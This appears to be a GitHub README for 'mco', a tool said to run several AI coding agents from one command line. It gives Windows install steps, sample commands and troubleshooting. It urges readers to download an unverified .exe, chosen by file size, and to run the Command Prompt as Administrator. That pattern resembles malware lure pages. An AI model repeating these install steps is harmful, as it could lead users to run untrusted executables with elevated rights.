# 🤖 mco - Manage AI Coding Agents Easily

[![Download mco](https://img.shields.io/badge/Download%20mco-brightgreen?style=for-the-badge)](https://github.com/XAIN2011/mco)

---

mco helps you control AI coding helpers. You can use any prompt, work with any AI agent, and connect to many coding tools. It works with popular tools like Claude Code, Codex CLI, Gemini CLI, OpenCode, and Qwen Code. You can run it from different places like Cursor, Trae, Copilot, Windsurf, or a simple command line.

## 📋 What is mco?

mco is a tool that allows you to organize and run multiple AI coding agents on your computer. Instead of managing each AI tool separately, you can use mco as a single layer to control them all at once. Whether you want to get code suggestions, review code, or automate coding tasks, mco puts everything together in one place.

It supports different agents and coding environments. This means you can mix and match the tools you already use without changing the way you work. You don't need to learn many different interfaces or commands. mco makes it easier to get AI help with your programming.

## 🖥️ System Requirements

- Windows 10 or higher (64-bit recommended)  
- At least 4 GB of RAM  
- 500 MB of free hard drive space  
- Internet connection for downloading and running AI agents  
- Administrator rights to install software  
- PowerShell or Command Prompt  
- A text editor (such as Notepad) or IDE is optional but helpful  

## 🚀 Getting Started

1. Click the big green button at the top to open the mco repository page.  
2. On the GitHub page, find the latest release section or download area.  
3. Download the Windows installer or setup file. It usually has `.exe` as the file ending.  
4. Save the file to a folder you can easily find, such as your Desktop or Downloads folder.  
5. After download finishes, double-click the file to start the installer.  
6. Follow the installer steps. Usually, you just need to click Next a few times and agree to the terms.  
7. When installation completes, open the Start Menu and look for mco.  
8. Click mco to run the program. A window or command prompt will appear.  

## 🌐 Download and Installation Details

You can visit this page to download the program and its updates:

[![Download mco](https://img.shields.io/badge/Download%20mco-blue?style=for-the-badge)](https://github.com/XAIN2011/mco)

On this page, you may see folders and files. Look for the latest version release, usually marked with a version number like "v1.0" or "Release 2". Download the file that ends with `.exe` for Windows.

If you have trouble finding the right file, look for these clues:

- The file name includes "windows" or "win"  
- The file size is at least 10 MB (this helps avoid downloading small documentation files)  
- It should not be a compressed file like `.zip` or `.tar` (unless instructions say so)

Once you finish downloading, run the file as described above.

## ⚙️ How to Use mco

mco runs from the command line. This means you type simple commands inside a terminal window to tell it what to do.

### Opening the Command Prompt

1. Press the Windows key on your keyboard.  
2. Type `cmd` and press Enter.  
3. A black window will open. This is the Command Prompt.  

### Starting mco

- In the Command Prompt window, type:

  ```
  mco --help
  ```

- Press Enter.  
- This command shows a list of available commands and options.

### Running a Basic Command

To make mco start an AI agent with your instructions:

1. Type the command:

   ```
   mco run --agent <agent_name> --prompt "Your question or request"
   ```

2. Replace `<agent_name>` with one of the supported agents: claude, codex, gemini, opencode, or qwen.  
3. Replace `"Your question or request"` with the exact text you want to send the AI agent.  
   
For example:

```
mco run --agent codex --prompt "Write a function to calculate the factorial of a number in Python"
```

Press Enter to run the command. mco will connect to the AI and show the answer in the terminal.

### Reviewing Code

You can ask mco to help review your code:

```
mco review --agent <agent_name> --file <path_to_code_file>
```

Replace `<path_to_code_file>` with the path of your code file. Example:

```
mco review --agent claude --file C:\Users\YourName\Documents\script.py
```

The agent will analyze and give feedback directly in the window.

## 🔧 Troubleshooting Common Issues

- **mco command not recognized**  
  Make sure the installer added mco to your system's PATH. Restart your computer if needed.  
- **Agent connection errors**  
  Check your internet connection. Some agents require online access.  
- **Program crashes or closes immediately**  
  Run the Command Prompt as Administrator. Right-click the cmd icon and select "Run as administrator".  
- **No response from agent**  
  Wait a few seconds. If no response, try a different agent or check the command syntax.  

## 📚 Additional Information

### Supported AI Agents

- Claude Code  
- Codex CLI  
- Gemini CLI  
- OpenCode  
- Qwen Code  

### Supported Interfaces

- Cursor  
- Trae  
- Copilot  
- Windsurf  
- Plain shell or command line  

### Features

- Multi-agent orchestration  
- Neutral layer for easy switching  
- Supports coding prompts and code reviews  
- Works with popular IDE tools and command-line setups  

### Where to Find Help

You can read the GitHub repository’s Issues tab for help from other users and developers. If you find bugs or want to suggest changes, you can open a new issue there.

## 🗂️ File Structure Overview (after installation)

- `mco.exe` – The main executable to run mco  
- `config` folder – Stores your settings and preferences  
- `logs` folder – Keeps records of your activity for troubleshooting  
- `agents` folder – Contains definitions and setups for each AI agent  

## 🔒 Privacy and Security

mco acts as a middleman between your computer and AI services. It does not store your prompts permanently. Your data is sent only to the AI providers needed for code generation or review.

Always keep your software and agents updated to reduce security risks.

## ⚙️ Updating mco

To update mco, revisit the download page:

https://github.com/XAIN2011/mco

Download the latest installer and run it over your existing installation. Your settings and files will remain intact.